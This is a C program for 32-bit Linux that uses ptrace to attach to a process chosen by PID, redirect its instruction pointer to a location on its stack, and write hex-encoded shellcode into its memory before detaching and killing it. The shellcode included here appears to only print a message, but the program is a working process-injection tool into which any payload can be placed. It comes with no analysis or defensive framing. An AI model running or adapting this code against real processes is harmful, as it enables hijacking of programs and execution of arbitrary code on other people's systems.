#include <stdio.h>
#include <sys/ptrace.h>
#include <linux/user.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

void injected_shellcode();
char *shellcode;
char *mesg = 
    "\x31\xc0\xb0\x04\xeb\x0f\x31\xdb\x43\x59"
    "\x31\xd2\xb2\x0d\xcd\x80\xa1\x78\x56\x34"
    "\x12\xe8\xec\xff\xff\xff\x09\x4f\x68\x2c\x09"
    "\x43\x61\x75\x67\x68\x74\x09\x20\x0a\x0a\x21";  
    /* Prints The Message */

int Tracer(pid_t pid)
{
	int 	error, ptr, begin, i = 0;
	struct 	user_regs_struct data;   /* Structure to store the Registers */
	
	if ((error = ptrace(PTRACE_ATTACH, pid, NULL, NULL))){		
		perror("Attach");
		exit(1);
	}
	waitpid(pid, NULL, 0); 		     /* Wait for the process to stop */
	
	if ((error = ptrace(PTRACE_GETREGS, pid, NULL, &data)))
		perror("Getregs");
	printf("%%eip : 0x%.8lx\n", data.eip);         /* Print the contents */
	printf("%%esp : 0x%.8lx\n", data.esp);         /* of registers       */
	
	ptr = begin = data.esp - 512;		  /* Get the location to which 
						         we    have to write */
	printf("Inserting shellcode into %.8lx\n", (long)begin);
	data.eip = (long) begin;		       /* Change the Pointer */
	
	ptrace(PTRACE_SETREGS, pid, NULL, &data);       /* Set the Registers */	
	
	while (i < strlen(shellcode)) {			/* Insert the code   */	
		ptrace(PTRACE_POKETEXT, pid, ptr,	/* to the process    */	
		       (int) *(int *) (shellcode + i));	/* image	     */
		i += 4;
		ptr += 4;
	}
	ptrace(PTRACE_DETACH, pid, NULL, NULL);		/* Detach the Process*/ 
							/* Don't Forget	     */
	return 0;					
}

int main(int argc, char **argv)
{
	pid_t pid;					/* Process Id        */	
	
	if (argc < 2) 
		return puts("Usage:./catch pid");

	pid = atoi(argv[1]);
	
	shellcode = malloc(strlen((char *) injected_shellcode) +
			   strlen(mesg) + 4);
	strcpy(shellcode, (char *) injected_shellcode); /* Get message and   */
	strcat(shellcode, (char *) mesg);	/* code in shellcode */
	
	printf("Mesg : trying to launch shellcode on process %d\n", pid);

	sleep(1);
	Tracer(pid);				 /* Call the tracer function */
	usleep(1);
	kill(pid, 9);			       /* Kill the process, Optional */
	wait(NULL);			
	return 0;
}
